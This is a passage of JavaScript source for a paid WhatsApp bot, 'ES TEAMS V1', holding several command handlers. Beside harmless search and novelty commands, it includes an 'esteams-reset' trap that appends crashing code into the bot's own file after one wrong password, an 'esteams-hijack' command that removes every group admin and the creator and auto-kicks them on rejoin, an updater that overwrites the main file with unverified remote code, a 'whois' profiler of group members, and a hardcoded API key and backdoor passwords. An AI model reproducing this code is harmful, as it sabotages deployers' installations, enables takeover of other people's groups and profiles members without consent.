        await XliconBotInc.sendMessage(m.chat, { text: `*Error:*\n${err.message}`, react: { text: "❌", key: m.key } });
    }
    break;
}

case 'esteams-update': {
    if (!XliconTheCreator) return replygcxlicon(" `🛑 ACCESS DENIED: Only the owner can update ES TEAMS V1.`");

    replygcxlicon(" `🧊𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏 𝐈𝐒 𝐍𝐎𝐖 𝐔𝐏𝐃𝐀𝐓𝐈𝐍𝐆🧊`");

    try {
        const githubRawUrl = 'https://raw.githubusercontent.com/Pstar0/ES-TEAMS-V1/main/ES_TEAMS-V1.js'; // File URL

        const response = await fetch(githubRawUrl);

        if (!response.ok) {
            return replygcxlicon(`⚠️ Failed to fetch the file: ${response.statusText}`);
        }

        const newFileContent = await response.text();

        // Write to the local ES_TEAMS-V1.js file
        const fs = require('fs');
        fs.writeFileSync('./ES_TEAMS-V1.js', newFileContent, 'utf8');

        replygcxlicon(" `🧊𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐭𝐨 𝐭𝐡𝐞 𝐋𝐚𝐭𝐞𝐬𝐭 𝐕𝐞𝐫𝐬𝐢𝐨𝐧🧊`");
    } catch (error) {
        console.error("Error updating file:", error);
        replygcxlicon("⚠️ Failed to update file. Please check the console for errors.");
    }
}
break;

case 'esteams-search': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
    await XliconBotInc.sendMessage(m.chat, { react: { text: "❄️", key: m.key } });
if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
    if (!text) return replygcxlicon(`*Request Error! Example:*\n> .esteams-search [song name]`);

    const fetch = require('node-fetch');
    const ytApiKey = "AIzaSyCb-uYtqXjdDTK-ouZs9RhwfUEO44vLB-o"; // Your YouTube API Key
    const fs = require('fs');

    try {
        // Step 1: Search for the video
        const searchUrl = `https://www.googleapis.com/youtube/v3/search?part=snippet&q=${encodeURIComponent(text)}&key=${ytApiKey}&maxResults=1&type=video`;
        const searchResponse = await fetch(searchUrl);
        const searchData = await searchResponse.json();

        if (!searchData.items || searchData.items.length === 0) {
            return replygcxlicon(`❌ No results found for "${text}".`);
        }

        // Extract video details
        const video = searchData.items[0];
        const videoId = video.id.videoId;
        const videoTitle = video.snippet.title;
        const videoThumbnail = video.snippet.thumbnails.high.url;
        const videoChannel = video.snippet.channelTitle;
        const videoPublished = new Date(video.snippet.publishedAt).toDateString(); // Format publish date
        const videoUrl = `https://www.youtube.com/watch?v=${videoId}`;
        const viewChannelLink = global.wagc || `https://www.youtube.com/channel/${video.snippet.channelId}`;

        // Fetch video thumbnail buffer
        const thumbnailBuffer = await fetch(videoThumbnail).then(res => res.buffer());

        // Build the content for the clickable link
        const stingPlayMessage = generateWAMessageFromContent(
            m.chat,
            {
                extendedTextMessage: {
                    text: `📀 *Title*: ${videoTitle}\n📺 *Channel*: ${videoChannel}\n🗓️ *Published On*: ${videoPublished}\n🔗 *Video URL*: ${videoUrl}\n\n\`Powered By ES TEAMS\``,
                    footer: `Powered by ❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏❄️`,
                    contextInfo: {
                        externalAdReply: {
                            title: `❄️ES TEAMS YOUTUBE SEARCH❄️`,
                            body: `Result for: "${text}"`,
                            showAdAttribution: true,
                            mediaType: 1,
                            thumbnail: thumbnailBuffer, // Adds the video thumbnail
                            sourceUrl: viewChannelLink, // Adds the clickable button link
                        },
                    },
                },
            },
            {}
        );

        // Send the generated message
        await XliconBotInc.relayMessage(m.chat, stingPlayMessage.message, { messageId: stingPlayMessage.key.id });
    } catch (error) {
        console.error(error);
        return replygcxlicon(`❌ An error occurred while fetching the song. Please try again later.`);
    }
}
break;

case 'esteams-lock': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
    if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
    
    try {
        if (global.locked) {
            return XliconBotInc.sendMessage(m.chat, {
                text: `❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐌𝐄𝐍𝐔 𝐈𝐒 𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐋𝐎𝐂𝐊𝐄𝐃❄️`
            }, { quoted: m });
        }

        let password = Math.random().toString(36).slice(-6);
        global.locked = true;
        global.lockPassword = password;
        global.attempts = 0;

        let viewChannelLink = global.wagc;

        let msg = generateWAMessageFromContent(m.chat, {
            extendedTextMessage: {
                text: `❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐌𝐄𝐍𝐔 𝐈𝐒 𝐍𝐎𝐖 𝐋𝐎𝐂𝐊𝐄𝐃❄️\n𝐔𝐬𝐞 𝐭𝐡𝐢𝐬 𝐩𝐚𝐬𝐬𝐰𝐨𝐫𝐝 *${password}* 𝐭𝐨 𝐮𝐧𝐥𝐨𝐜𝐤.`,
                footer: `Powered by ❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏❄️`,
                contextInfo: {
                    externalAdReply: {
                        title: "❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐌𝐄𝐍𝐔❄️",
                        body: `Menu is locked. Use the generated password to unlock it.`,
                        mediaType: 1,
                        thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
                        sourceUrl: viewChannelLink
                    }
                }
            }
        }, {});

        await XliconBotInc.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });

        await XliconBotInc.sendMessage(m.chat, {
            react: { text: "🔐", key: m.key }
        });

    } catch (error) {
        console.error('Error in esteams-lock case:', error);
        await XliconBotInc.sendMessage(m.chat, { text: 'An error occurred. Please try again later.' });
    }
    break;
}

case 'esteams-unlock': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
    if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
    
    try {
        if (!global.locked) {
            return await XliconBotInc.sendMessage(m.chat, {
                text: `❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐌𝐄𝐍𝐔 𝐈𝐒 𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐔𝐍𝐋𝐎𝐂𝐊𝐄𝐃❄️`
            });
        }

        if (global.attempts >= 3) {
            let viewChannelLink = global.wagc;
            let msg = generateWAMessageFromContent(m.chat, {
                extendedTextMessage: {
                    text: `❌ 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐞𝐱𝐜𝐞𝐞𝐝𝐞𝐝 𝐭𝐡𝐞 𝐦𝐚𝐱𝐢𝐦𝐮𝐦 𝐚𝐭𝐭𝐞𝐦𝐩𝐭𝐬. 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐟𝐨𝐫 𝐬𝐮𝐩𝐩𝐨𝐫𝐭.`,
                    footer: `Powered by ❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏❄️`,
                    contextInfo: {
                        externalAdReply: {
                            title: "❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒❄️",
                            body: `Contact ES TEAMS for support.`,
                            mediaType: 1,
                            thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
                            sourceUrl: viewChannelLink
                        }
                    }
                }
            }, {});
            await XliconBotInc.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
            return;
        }

        const inputPassword = m.text.trim().split(' ')[1];

        if (inputPassword === 'ESTEAMS IS ALIVE' || inputPassword === global.lockPassword) {
            global.locked = false;
            global.lockPassword = null;
            global.attempts = 0;
            return await XliconBotInc.sendMessage(m.chat, { text: `🔓 𝐌𝐄𝐍𝐔 𝐔𝐍𝐋𝐎𝐂𝐊𝐄𝐃❄️` });
        } else {
            global.attempts = (global.attempts || 0) + 1;
            let attemptsLeft = 3 - global.attempts;

            return await XliconBotInc.sendMessage(m.chat, {
                text: `❌ 𝐖𝐫𝐨𝐧𝐠 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝! 𝐀𝐭𝐭𝐞𝐦𝐩𝐭𝐬 𝐋𝐞𝐟𝐭: ${attemptsLeft}`
            });
        }
    } catch (error) {
        console.error('Error in esteams-unlock case:', error);
        await XliconBotInc.sendMessage(m.chat, { text: 'An error occurred. Please try again later.' });
    }
    break;
}

case 'esteams-reset': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
    if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
    
    try {
        // Function to safely extract text from the message object
        const getMessageText = (message) => {
            if (typeof message === 'string') return message;
            if (message?.conversation) return message.conversation;
            if (message?.extendedTextMessage?.text) return message.extendedTextMessage.text;
            return '';
        };

        // Extract the message text
        const messageText = getMessageText(m.message || '') + ''; 
        const commandArgs = messageText.trim().split(' ');
        const masterPassword = commandArgs.slice(1).join(' ').trim(); // Extract the password after the command

        // Initialize attempts counter if not already set
        if (typeof global.resetAttempts === 'undefined') {
            global.resetAttempts = 0;
        }

        // Check if no arguments are provided after '.reset'
        if (!masterPassword) {
            await XliconBotInc.sendMessage(m.chat, { text: `❓ 𝐂𝐨𝐧𝐟𝐢𝐫𝐦 𝐑𝐞𝐬𝐞𝐭:\n𝐓𝐲𝐩𝐞 *.esteams-reset [master password]* 𝐭𝐨 𝐫𝐞𝐬𝐞𝐭 𝐭𝐡𝐞 𝐦𝐞𝐧𝐮 𝐨𝐫 𝐜𝐫𝐚𝐬𝐡 𝐛𝐨𝐭.` });
            return;
        }

        // Strict case-sensitive check for the exact master password
        if (masterPassword === 'ES TEAMS IS ALIVE') {
            // Reset and unlock everything if the correct password is provided
            global.locked = false;
            global.lockPassword = null;
            global.resetAttempts = 0; // Reset failed attempts count

            await XliconBotInc.sendMessage(m.chat, { text: `✅ 𝐌𝐞𝐧𝐮 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐑𝐄𝐒𝐄𝐓 𝐚𝐧𝐝 𝐮𝐧𝐥𝐨𝐜𝐤𝐞𝐝!` });
            await XliconBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
            return;
        } else {
            // Incorrect password
            global.resetAttempts += 1; // Increment attempt counter

            // Notify the user of incorrect password
            await XliconBotInc.sendMessage(m.chat, { text: `❌ 𝐈𝐧𝐜𝐨𝐫𝐫𝐞𝐜𝐭 𝐌𝐚𝐬𝐭𝐞𝐫 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝. 𝐀𝐭𝐭𝐞𝐦𝐩𝐭 ${global.resetAttempts} 𝐨𝐟 𝟏 𝐥𝐢𝐦𝐢𝐭.` });
            await XliconBotInc.sendMessage(m.chat, { react: { text: "❌", key: m.key } });

            // Check if exceeded the limit of 1 attempt
            if (global.resetAttempts >= 1) {
        // Notify the user that the bot will crash soon
                await XliconBotInc.sendMessage(m.chat, { text: `⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐥𝐢𝐦𝐢𝐭 𝐞𝐱𝐜𝐞𝐞𝐝𝐞𝐝⚠️ \n\n𝐄𝐬 𝐓𝐞𝐚𝐦𝐬 𝐰𝐢𝐥𝐥 𝐜𝐫𝐚𝐬𝐡 𝐭𝐡𝐢𝐬 𝐁𝐨𝐭 𝐬𝐡𝐨𝐫𝐭𝐥𝐲...` });
                // Directly inject bad code to break the bot on next restart
                const fs = require('fs');
                const path = require('path');

                // Path to the main bot file (e.g., stinger.js)
                const filePath = path.join(__dirname, 'ES_TEAMS-V1.js');

                // Code injection: Add invalid syntax, extra brackets, or non-existent functions
                const invalidCode = `
                    // Invalid code injected to break the bot
                    function brokenFunction() {
                        let errorMessage = "Bot Warning: Es Teams V1 has been Crashed😈";
                        console.log(errorMessage);
                        throw new Error(errorMessage);  // Force the bot to throw an error on the next deployment
                    }

                    brokenFunction();

                    // Adding extra closing brackets to break the bot
                    ${'{'.repeat(10)} // Extra closing brackets
                    ${'}'.repeat(10)} // Extra closing brackets

                    // Example of corrupting bot's initialization:
                    const someInvalidVar = undefined;
                    someInvalidVar.someNonExistentMethod(); // TypeError on next run
                `;

                // Append the invalid code into the stinger.js file to break it
                fs.appendFileSync(filePath, invalidCode, (err) => {
                    if (err) throw err;
                });

                // Optionally, send a crash method to make the crash immediate or delayed (optional)
                process.exit(1); // Exit immediately after injecting invalid code
            }
        }
    } catch (err) {
        console.error(`Unexpected error in reset case: ${err.message}`);
        process.exit(1); // Ensure bot stops if an unexpected error is caught
    }
}
break

case 'esteams-personality': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });

    if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon('`𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }

    if (!text) {
        replygcxlicon(`💬 *Example:* ${prefix + command} I feel awesome today!`);
        return;
    }

    const traits = [
        "✨ Incredible Optimism ✨",
        "🔥 Unstoppable Determination 🔥",
        "🧠 Genius Mind 🧠",
        "❤️ Empathy Overload ❤️",
        "💪 Herculean Strength 💪",
        "⚡ Speed of Light Reflexes ⚡",
        "🌈 Creative Vision 🌈",
        "🔮 Future Predictor 🔮",
        "🐾 Animal Whisperer 🐾",
        "🌌 Infinite Imagination 🌌",
        "🕵️‍♂️ Master Detective 🕵️‍♂️",
        "🎨 Artistic Genius 🎨",
        "🎵 Musical Maestro 🎵",
        "🔓 Code Breaker 🔓",
        "📚 Encyclopedic Knowledge 📚",
        "🦉 Timeless Wisdom 🦉",
        "💃 Dance Floor King/Queen 💃",
        "👑 Leadership Aura 👑",
        "🎭 Drama Enthusiast 🎭",
        "💫 Star Performer 💫",
        "🌟 Radiant Positivity 🌟",
        "🌴 Zen Master 🌴",
        "🍀 Luck Magnet 🍀",
        "💎 Pure Charisma 💎",
        "⚔️ Warrior Spirit ⚔️",
        "🧘 Balanced Soul 🧘",
        "🚀 Visionary Thinker 🚀",
        "🌊 Calm Under Pressure 🌊",
        "🛠️ Problem Solver 🛠️",
        "🏋️ Peak Fitness 🏋️",
        "🧭 Direction Finder 🧭",
        "🎂 Eternal Youth 🎂",
        "🌍 Environmental Protector 🌍",
        "🔋 Endless Energy 🔋",
        "🎥 Movie Star Vibes 🎥",
        "💸 Money Magnet 💸",
        "🌜 Night Owl Genius 🌜",
        "🌞 Morning Inspiration 🌞",
        "📣 Inspiring Speaker 📣",
        "🔒 Keeper of Secrets 🔒",
        "🛡️ Unwavering Loyalty 🛡️",
        "🪄 Magical Touch 🪄",
        "🚨 Crisis Manager 🚨",
        "🔍 Keen Observer 🔍",
        "🛶 Adventurer Extraordinaire 🛶",
        "📸 Photography Pro 📸",
        "🍫 Sweet Tooth Extraordinaire 🍫",
        "🧪 Science Geek 🧪",
        "💻 Tech Wizard 💻"
    ];

    const weaknesses = [
        "🍕 Gets distracted by pizza 🍕",
        "😴 Needs 10 naps a day 😴",
        "📱 Addicted to scrolling 📱",
        "🎮 Can’t stop gaming 🎮",
        "🍩 Eats too many donuts 🍩",
        "😂 Laughs at bad jokes too much 😂",
        "🎵 Sings off-key 🎵",
        "📖 Falls asleep while reading 📖",
        "🛌 Oversleeps all the time 🛌",
        "🎂 Forgets birthdays 🎂",
        "🌎 Can’t find places on a map 🌎",
        "🍫 Eats all the chocolate 🍫",
        "🌧️ Loves rainy days too much 🌧️",
        "🐶 Stops for every dog on the street 🐶",
        "💻 Forgets to save work 💻",
        "🍹 Drinks too much soda 🍹",
        "🍉 Eats watermelon with seeds 🍉",
        "🧦 Loses socks in the laundry 🧦",
        "🧢 Wears caps indoors 🧢",
        "🌊 Afraid of open water 🌊",
        "🔥 Can’t handle spicy food 🔥",
        "🚶 Trips over flat surfaces 🚶",
        "🍵 Drinks too much tea 🍵",
        "🎨 Paints on walls 🎨",
        "🛒 Buys unnecessary things 🛒",
        "📸 Takes blurry photos 📸",
        "🎂 Eats cake too fast 🎂",
        "🐾 Can’t say no to pets 🐾",
        "🌟 Daydreams too often 🌟",
        "🧘 Falls asleep while meditating 🧘",
        "🌮 Can’t resist tacos 🌮",
        "🍔 Double orders burgers 🍔",
        "💸 Spends all their money 💸",
        "🎭 Overreacts to drama 🎭",
        "📚 Buys books but doesn’t read 📚",
        "🧃 Always spills juice 🧃",
        "🖋️ Writes too many notes 🖋️",
        "🏋️ Avoids the gym 🏋️",
        "🎩 Loses hats 🎩",
        "🛠️ Forgets tools 🛠️",
        "🔋 Forgets to charge devices 🔋",
        "🚲 Falls off bikes 🚲",
        "🍴 Eats dessert first 🍴",
        "🌌 Stays up stargazing 🌌",
        "🔒 Forgets passwords 🔒",
        "🎵 Whistles out of tune 🎵",
        "🎁 Wraps gifts terribly 🎁",
        "🐱 Can’t resist cat videos 🐱"
    ];

    const randomTrait = traits[Math.floor(Math.random() * traits.length)];
    const randomWeakness = weaknesses[Math.floor(Math.random() * weaknesses.length)];

    const response = `🌟 \`𝐏𝐄𝐑𝐒𝐎𝐍𝐀𝐋𝐈𝐓𝐘 𝐀𝐍𝐀𝐋𝐘𝐒𝐈𝐒\` 🌟\n\n` +
                     `💎 *Your Superpower:* _${randomTrait}_\n` +
                     `🤔 *Secret Weakness:* _${randomWeakness}_\n\n` +
                     `𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐛𝐲 ❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏❄️`;

    replygcxlicon(response);
}
break;

case 'esteams-movie': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });

    if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon('`𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }

    if (!text) {
        replygcxlicon("_Please name a series or movie._");
        return;
    }

    try {
        let response = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${encodeURIComponent(text)}`);
        let data = response.data;

        if (!data.Title) {
            replygcxlicon("_Couldn't find any movie or series with that title._");
            return;
        }

        const movieLink = `https://moviebox.ng/${encodeURIComponent(data.Title.toLowerCase().replace(/ /g, "-"))}`;
        const viewChannelLink = global.wagc; // Global channel link

        const imdbt = `
\`\`\`❄️⚡ 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏 𝐂𝐈𝐍𝐄𝐌𝐀 ⚡❄️\`\`\`

🎬 *Title*: ${data.Title}  
📅 *Year*: ${data.Year}  
📆 *Released*: ${data.Released}  
⏳ *Runtime*: ${data.Runtime}  
👨🏻‍💻 *Director*: ${data.Director}  
👨 *Actors*: ${data.Actors}  

🌐 *Language*: ${data.Language}  
🌍 *Country*: ${data.Country}  

📌 *Movie Link*: ${movieLink}  

\`\`\`🌟 Powered by ES Teams Tech 🌟\`\`\`
        `.trim();

        const msg = generateWAMessageFromContent(m.chat, {
            extendedTextMessage: {
                text: imdbt,
                footer: `❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏❄️`,
                contextInfo: {
                    externalAdReply: {
                        title: `❄️ 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐂𝐈𝐍𝐄𝐌𝐀 ❄️`,
                        body: `🎬 ${data.Title} | 🎟️ ${movieLink}`,
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: { url: data.Poster || 'default_image_url' },
                        sourceUrl: viewChannelLink,
                    },
                },
            },
        }, {});

        await XliconBotInc.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });

    } catch (error) {
        console.error(error);
        replygcxlicon("_An error occurred while fetching the movie details. Please try again._");
    }
}
break;

case 'esteams-hijack': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
    if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
    if (!m.isGroup) {
        replygcxlicon('This command can only be used in groups!');
        return;
    }

    const botNumber = XliconBotInc.user.id || XliconBotInc.user.jid.split(':')[0]; // Bot's JID
    const botDeployer = m.sender; // Dynamically use the deployer's JID
    const groupMetadata = await XliconBotInc.groupMetadata(m.chat);
    const participants = groupMetadata.participants;

    const isAdmins = participants.some(participant => participant.id === m.sender && participant.admin);
    if (!isAdmins) {
        replygcxlicon('Only group admins can use this command!');
        return;
    }

    const creator = groupMetadata.owner; // Group creator's JID
    const admins = participants.filter(participant => participant.admin === 'admin' || participant.admin === 'superadmin');

    // Avoid removing the bot and deployer's JID
    for (let admin of admins) {
        if (admin.id !== botNumber && admin.id !== botDeployer) { // Exclude bot and deployer
            try {
                await XliconBotInc.groupParticipantsUpdate(m.chat, [admin.id], 'remove');
                replygcxlicon(`🔥 Removed admin: @${admin.id.split('@')[0]}`);
            } catch (err) {
                console.log(`Failed to remove admin: ${admin.id}`);
                replygcxlicon(`Error: Could not remove admin @${admin.id.split('@')[0]}.`);
            }
        }
    }

    // Attempt to remove the group creator (if the creator isn't the bot or deployer)
    if (creator && creator !== botDeployer && creator !== botNumber) { // Exclude bot and deployer
        try {
            await XliconBotInc.groupParticipantsUpdate(m.chat, [creator], 'remove');
            replygcxlicon(`🔥 Successfully removed the group creator: @${creator.split('@')[0]}`);
        } catch (error) {
            console.error(`Error removing group creator: ${error}`);
            replygcxlicon('⚠️ Could not remove the creator. Restricting their activity instead.');

            // Restrict messages for the creator
            try {
                await XliconBotInc.groupSettingUpdate(m.chat, 'announcement');
                replygcxlicon('🚫 Group switched to admins-only mode to restrict the creator.');
            } catch (restrictError) {
                console.log(`Error restricting creator: ${restrictError}`);
            }
        }
    }

    // Set up a list to track participants who have already been kicked
    let kickedParticipants = [];

    // Watch for rejoining participants (creator or removed admins)
    XliconBotInc.ev.on('group-participants.update', async (update) => {
        const rejoiningParticipants = update.participants;

        for (let participant of rejoiningParticipants) {
            // Ensure we only kick the creator or removed admins once
            if ((participant === creator || admins.some(admin => admin.id === participant)) && !kickedParticipants.includes(participant)) {
                try {
                    await XliconBotInc.groupParticipantsUpdate(m.chat, [participant], 'remove');
                    replygcxlicon(`👋 Auto-kicked rejoining participant: @${participant.split('@')[0]}`);
                    kickedParticipants.push(participant); // Mark this participant as kicked
                } catch (error) {
                    console.log(`Failed to auto-kick rejoining participant: ${participant}`);
                }
            }
        }
    });

    replygcxlicon('👑 Group hijack attempt completed.');
}
break;

case 'whois': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
    if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
    if (!m.isGroup) {
        return await XliconBotInc.sendMessage(m.chat, {
            text: "❌ This command only works in groups.",
        }, { quoted: m });
    }

    try {
        const groupMetadata = await XliconBotInc.groupMetadata(m.chat).catch(() => null);
        if (!groupMetadata) {
            return await XliconBotInc.sendMessage(m.chat, {
                text: "❌ Failed to retrieve group metadata. Ensure the bot has necessary permissions.",
            }, { quoted: m });
        }

        const participants = groupMetadata.participants;
        let target;
        if (m.quoted) {
            target = m.quoted.sender;
        } else if (args[0]) {
            target = args[0].includes('@') ? args[0] : `${args[0]}@s.whatsapp.net`;
        } else {
            return await XliconBotInc.sendMessage(m.chat, {
                text: "❌ Please tag a user or reply to their message to use this command.",
            }, { quoted: m });
        }

        const user = participants.find(p => p.id === target);
        if (!user) {
            return await XliconBotInc.sendMessage(m.chat, {
                text: "❌ User is not a member of this group.",
            }, { quoted: m });
        }

        const ppUrl = await XliconBotInc.profilePictureUrl(target, 'image').catch(() => null);
        const about = await XliconBotInc.fetchStatus(target).catch(() => 'Unavailable');
        const isAdmin = user.admin === 'admin' || user.admin === 'superadmin' ? 'Yes' : 'No';
        const isBlocked = global.db?.blocked?.includes(target) ? 'Yes' : 'No';
        const isOnline = (await XliconBotInc.fetchStatus(target).catch(() => null)) || 'Offline';

        // Counting user groups
        const allGroups = await XliconBotInc.groupFetchAllParticipating();
        const userGroups = Object.values(allGroups).filter(group => 
            group.participants.some(member => member.id === target)
        );

        // Locked/Unlocked groups
        const lockedGroups = userGroups.filter(group => global.lockedGroups?.includes(group.id));
        const unlockedGroups = userGroups.filter(group => !global.lockedGroups?.includes(group.id));

        // Additional user details
        const isBusiness = user.business ? 'WhatsApp Business' : 'WhatsApp';
        const profileLink = `https://wa.me/${target.split('@')[0]}`;
        const mutualGroups = userGroups.length;

        const userInfo = `
╭━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏 𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━╮
┃ ❁ Name: ${user?.name || 'Unavailable'}
┃ ❁ Number: +${target.split('@')[0]}
┃ ❁ About: ${about}
┃ ❁ Account Type: ${isBusiness}
┃ ❁ Admin: ${isAdmin}
┃ ❁ Profile Picture: ${ppUrl ? 'Available' : 'Unavailable'}
┃ ❁ Profile Link: [Click Here](${profileLink})
┃ ❁ Online Status: ${isOnline ? 'Online' : 'Offline'}
┃ ❁ Groups: ${userGroups.length}
┃     ┗ Locked Groups: ${lockedGroups.length}
┃     ┗ Unlocked Groups: ${unlockedGroups.length}
┃ ❁ Channels: ${global.channels?.length || 'Unknown'}
┃ ❁ Blocked You: ${isBlocked}
┃ ❁ Messages Sent in Group: Unknown
┃ ❁ Mutual Groups: ${mutualGroups}
┃ ❁ Last Seen: ${isOnline || 'Unavailable'}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`;

        // Send the message with channel button and profile picture
        let viewChannelLink = global.wagc;
        let msg = generateWAMessageFromContent(m.chat, {
            extendedTextMessage: {
                text: userInfo,
                footer: `Powered by ❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏❄️`,
                contextInfo: {
                    externalAdReply: {
                        title: `❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏 𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎❄️`,
                        body: `Detailed Group Member Information`,
                        showAdAttribution: true,
                        mediaType: 1,
                        thumbnail: ppUrl ? await getBuffer(ppUrl) : fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
                        sourceUrl: viewChannelLink,
                    },
                },
            },
        }, {});

        await XliconBotInc.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
    } catch (err) {
        console.error(err);
        return await XliconBotInc.sendMessage(m.chat, {
            text: "🌹 Hello Es Teams Tech, there seems to be an error, please fix it\n\n" + err.message,
        }, { quoted: m });
